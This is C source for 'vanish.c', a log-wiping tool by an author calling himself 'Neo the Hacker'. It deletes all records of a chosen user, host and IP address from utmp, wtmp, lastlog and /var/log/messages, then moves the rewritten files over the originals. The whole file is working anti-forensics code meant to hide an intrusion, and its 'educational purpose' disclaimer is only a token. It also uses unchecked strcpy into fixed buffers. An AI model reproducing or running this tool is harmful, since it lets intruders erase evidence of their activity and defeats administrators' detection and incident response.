/***************************************************************************
                          vanish.c  -  description                           
                            -------------------                           
                  begin                : Wed Feb 2 2000                       
                  copyright            : (C) 2000 by Neo the Hacker     
                  email                : --------------------------     
                             
***************************************************************************/

/***************************************************************************
* Vanish.c cleans WTMP, UTMP, lastlog, messages, secure, xferlog, maillog, *
* warn, mail, httpd.access_log, httpd.error_log. Use your brain, check your*
* logs and edit accordingly !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*
****************************************************************************
* Warning!! This programm is for educational purpouse only! I am not       *
* responsible to anything you do with this !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*
****************************************************************************
* Code written for Unix like systems! Tested on SuSE-Linux 6.2 !           *
* Compile like: gcc vanish.c -o vanish                                     *
***************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>		
#include <utmp.h>		
#include <sys/types.h>		
#include <unistd.h>
#include <lastlog.h>
#include <pwd.h>

#define UTMP            "/var/run/utmp"
#define WTMP            "/var/log/wtmp"
#define LASTLOG         "/var/log/lastlog"
#define MESSAGES        "/var/log/messages"
/*
#define SECURE          "/var/log/secure"
#define XFERLOG         "/var/log/xferlog"
#define MAILLOG         "/var/log/maillog"     
#define WARN            "/var/log/warn"
#define MAIL            "/var/log/mail"
#define HTTPDA          "/var/log/httpd.access_log"
#define HTTPDE          "/var/log/httpd.error_log"
*/
#define MAXBUFF		8*1024

int main(int argc, char *argv[]) {
	struct utmp ut ;		
	struct lastlog ll ;		
	struct passwd *pass ;
	int i, size, fin, fout ;
	FILE *pfile;
	FILE *pfile2;
	char *varlogs[] = {MESSAGES} ; 
	char *newlogs[] = {"messages.hm", "secure.hm","xferlog.hm","maillog.hm","warn.hm", "mail.hm", "httpda.hm", "httpde.hm"} ;  
	char buffer[MAXBUFF] ;
	char user[10] ;		
	char host[100] ;		
	char host_ip[17] ;

	if (argc!=4) {
		printf ("\n\n");
		fprintf(stderr, "Vanish by Neo the Hacker\n");
		fprintf(stderr, "Usage: %s <user> <host> <IP>\n\n",argv[0]) ;
		exit(-1) ;
	}

	/***************************
	* OK Let's start with UTMP *
	***************************/
	size = sizeof(ut) ;
	strcpy (user, argv[1]) ;
	fin = open (UTMP, O_RDWR) ;
	if (fin < 0) {
		fprintf(stderr, "\nFucking shit!! Utmp permission denied.Getting outta here!!\n");  
		close (fin) ;
		exit(-1);
	}
	else {
		while (read (fin, &ut, size) == size) {
			if (!strncmp(ut.ut_user, user, strlen(user))) {
				memset(&ut, 0, size);
				lseek(fin, -1*size, SEEK_CUR);
				write (fin, &ut, size);
			}
		}
		close (fin);
	}
	
	/***************************
	* OK Let's go on with WTMP *
	***************************/
	strcpy (host, argv[2]) ;
	strcpy(host_ip, argv[3]) ;
	fin = open(WTMP, O_RDONLY) ;
	if (fin < 0) {
		fprintf(stderr, "\nFucking shit!! Wtmp permission denied.Getting outta here.\n") ; 		                              
		close (fin); 		
		exit(-1);
	}
	fout = open("wtmp.hm", O_WRONLY|O_CREAT) ;
	if (fout < 0) {
		fprintf(stderr, "\nDamn! Problems targeting wtmp. Getting outta here.\n") ;	
		close (fout) ;
		exit(-1) ;
	}
	else {
		while (read (fin, &ut, size) == size) {
			if ( (!strcmp(ut.ut_user, user)) || (!strncmp(ut.ut_host, host, strlen(host))) ) {
 		 	/* let it go into oblivion */  ; 	
	} 			
        else write (fout, &ut, size) ; 		}
		close (fin) ;
		close (fout) ;
		if ((system("/bin/mv wtmp.hm /var/log/wtmp") < 0) && (system("/bin/mv wtmp.hm /var/log/wtmp") == 127)) {
			fprintf(stderr, "\nAch. Couldn't replace %s .", WTMP) ;
		}
                system("/bin/chmod 644 /var/log/wtmp") ;
	}
	/***************************
	* OK Let's look at LASTLOG *
	***************************/
	size = sizeof(ll) ;
	fin = open(LASTLOG, O_RDWR) ;
	if (fin < 0) {
		fprintf(stderr, "\nFucking shit!! Lastlog permission denied.Getting outta here.\n") ; 		
                close (fin) ;
		exit(-1) ;
	}
	else {
		pass = getpwnam(user) ;
		lseek(fin, size*pass->pw_uid, SEEK_SET) ;
		read(fin, &ll, size) ;
		ll.ll_time = 0 ;
		strncpy (ll.ll_line, "      ", 5) ;
		strcpy (ll.ll_host, " ") ;
		lseek(fin, size*pass->pw_uid, SEEK_SET) ;
		write(fin, &ll, size) ;
		close (fin) ;
	}

	i=0;
	while (i<1) {
		pfile = fopen (varlogs[i],"r");
		if (!pfile) {
			i++;
			continue ;
	}

	pfile2 = fopen (newlogs[i],"w");
	if (!pfile2) {
		i++;   
		continue;
	}
	else {
		while (fgets(buffer, MAXBUFF, pfile) != NULL) {
			if ((!strstr(buffer, user)) && (!strstr(buffer, host))&&(!strstr(buffer, host_ip)))  { 			
				fputs(buffer,pfile2) ;  } }
			}
			fclose (pfile);
			fclose (pfile2);
			i++;
	}
	printf ("\n");
	system ("mv messages.hm /var/log/messages");
	printf ("\n");
	exit(-1);
}
